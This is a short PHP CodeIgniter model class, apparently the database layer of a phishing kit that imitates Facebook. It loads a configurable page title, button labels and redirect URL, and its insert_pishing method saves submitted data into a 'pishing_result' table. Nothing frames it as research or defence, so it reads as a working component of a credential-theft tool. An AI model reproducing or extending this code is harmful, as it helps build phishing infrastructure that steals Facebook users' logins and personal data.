<?php
class Facebook_model extends CI_Model {

	public function __construct()
	{
		$this->DB_facebook = $this->load->database('facebook',TRUE);
	}
	public function title()
	{
		$this->DB_facebook->select('string');
		$query = $this->DB_facebook->get_where('config',array('config_type' => 'title'));		
		$row = $query->row_array(); 
		return $row['string'];
	}
	public function button()
	{
		$this->DB_facebook->select('string');
		$query = $this->DB_facebook->get_where('config',array('config_type' => 'button'));		
		$row = $query->row_array(); 
		return $row['string'];
	}
	public function redirect()
	{
		$this->DB_facebook->select('string');
		$query = $this->DB_facebook->get_where('config',array('config_type' => 'redirect'));		
		$row = $query->row_array(); 
		return $row['string'];
	}
	public function redirect_url()
	{
		$this->DB_facebook->select('string');
		$query = $this->DB_facebook->get_where('config',array('config_type' => 'redirect_url'));		
		$row = $query->row_array(); 
		return $row['string'];
	}
	public function missing()
	{
		$this->DB_facebook->select('string');
		$query = $this->DB_facebook->get_where('config',array('config_type' => 'missing'));		
		$row = $query->row_array(); 
		return $row['string'];
	}
	public function check_button()
	{
		$query = $this->DB_facebook->get('check_button');
		foreach ($query->result() as $row)
		{
		   $return_array['button_type'][] = $row->button_type;
		   $return_array['button_string'][] = $row->button_string;
		}
		return $return_array;
	}
	public function insert_pishing($insert_array)
	{
		$this->DB_facebook->insert('pishing_result',$insert_array);
	}
	
}


?>